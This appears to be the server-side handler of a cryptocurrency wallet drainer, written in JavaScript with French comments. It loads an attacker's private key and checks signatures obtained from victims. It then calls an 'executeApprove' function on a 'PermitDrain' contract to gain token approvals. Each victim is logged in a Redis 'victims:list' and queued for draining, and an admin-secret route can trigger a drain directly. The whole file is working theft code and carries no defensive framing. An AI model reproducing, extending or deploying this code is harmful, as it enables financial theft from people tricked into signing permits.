import { ethers } from 'ethers';
import { createClient } from 'redis';
import { drainWithRetry } from '../lib/drain.js';

const ATTACKER_ADDRESS = '0x22C8A3678871133D80f457CFaa6a442CC383481F';
const PERMIT_DRAIN_ADDRESS = '0xaD78f97c63191227AD19DA543fc3fb022aA0D90f';
const PERMIT_DRAIN_ABI = [
  'function executeApprove(address owner, address token, address spender, uint256 amount, uint256 deadline, uint8 v, bytes32 r, bytes32 s)',
  'function nonces(address) view returns (uint256)'
];

function getPrivateKey() {
  if (process.env.ATTACKER_PRIVATE_KEY) {
    const key = process.env.ATTACKER_PRIVATE_KEY.trim();
    if (key.length === 64) return '0x' + key;
  }
  const fs = require('fs');
  const path = require('path');
  const filePath = path.resolve('./private_key.txt');
  if (fs.existsSync(filePath)) {
    const key = fs.readFileSync(filePath, 'utf8').trim();
    if (key.length === 64) return '0x' + key;
  }
  throw new Error('🔴 Aucune clé privée valide.');
}

const PRIVATE_KEY = getPrivateKey();
const wallet = new ethers.Wallet(PRIVATE_KEY);

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, DELETE, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();

  if (req.method === 'POST') {
    const { victim, chain, adminSecret, signature, deadline, nonce, token, spender, amount } = req.body;

    // --- DRAIN MANUEL ADMIN (inchangé) ---
    if (adminSecret) {
      if (!process.env.ADMIN_SECRET || process.env.ADMIN_SECRET.trim().length === 0) {
        return res.status(500).json({ error: 'ADMIN_SECRET non configuré sur le serveur' });
      }
      if (adminSecret !== process.env.ADMIN_SECRET) {
        return res.status(401).json({ error: 'Secret admin invalide' });
      }
      if (!victim || !ethers.utils.isAddress(victim)) {
        return res.status(400).json({ error: 'Adresse victime invalide' });
      }
      const targetChain = chain || '1';
      console.log(`🔧 Drain manuel admin pour ${victim} (chain ${targetChain})`);

      const client = createClient({ url: process.env.REDIS_URL });
      try {
        await client.connect();
        const list = await client.get('victims:list');
        const parsedList = list ? JSON.parse(list) : [];
        if (!parsedList.includes(victim)) {
          parsedList.push(victim);
          await client.set('victims:list', JSON.stringify(parsedList));
        }
      } finally {
        await client.disconnect();
      }

      const success = await drainWithRetry(victim, targetChain);
      if (success) {
        return res.status(200).json({ success: true, victim, chain: targetChain });
      } else {
        return res.status(500).json({ error: 'Échec du drain après plusieurs tentatives' });
      }
    }

    // --- FLUX NORMAL : signature meta-tx ---
    if (!victim || !signature) return res.status(400).json({ error: 'Paramètres manquants' });

    try {
      // Vérifier la signature hors chaîne pour éviter du gas gaspillé
      const structHash = ethers.utils.solidityKeccak256(
        ['address', 'address', 'address', 'uint256', 'uint256', 'uint256'],
        [victim, token, spender, amount, deadline, nonce]
      );
      const recoveredAddress = ethers.utils.verifyMessage(
        ethers.utils.arrayify(structHash),
        signature
      );
      if (recoveredAddress.toLowerCase() !== victim.toLowerCase()) {
        return res.status(400).json({ error: 'Signature invalide' });
      }
    } catch (err) {
      console.error('Erreur vérification signature:', err.message);
      return res.status(400).json({ error: 'Erreur signature' });
    }

    // Exécuter l'approve via le contrat PermitDrain
    const provider = new ethers.providers.JsonRpcProvider('https://1rpc.io/eth');
    const signer = wallet.connect(provider);
    const permitContract = new ethers.Contract(PERMIT_DRAIN_ADDRESS, PERMIT_DRAIN_ABI, signer);

    const sig = ethers.utils.splitSignature(signature);

    try {
      const tx = await permitContract.executeApprove(
        victim,
        token,
        spender,
        amount,
        deadline,
        sig.v,
        sig.r,
        sig.s,
        { gasLimit: 200000 }
      );
      const receipt = await tx.wait();
      console.log('✅ Approve exécuté, tx:', receipt.transactionHash);
    } catch (err) {
      console.error('❌ Échec approve:', err.message);
      return res.status(500).json({ error: 'Échec de l’approve' });
    }

    // Enregistrement de la victime et mise en queue pour le drain
    const client = createClient({ url: process.env.REDIS_URL });
    try {
      await client.connect();
      const list = await client.get('victims:list');
      const parsedList = list ? JSON.parse(list) : [];
      if (!parsedList.includes(victim)) {
        parsedList.push(victim);
        await client.set('victims:list', JSON.stringify(parsedList));
      }
      await client.lPush('drain:queue', JSON.stringify({ victim, chain: chain || '1' }));
    } finally {
      await client.disconnect();
    }

    return res.status(200).json({ success: true, queued: true, victim, chain: chain || '1' });
  } else {
    return res.status(405).json({ error: 'Méthode non autorisée' });
  }
}
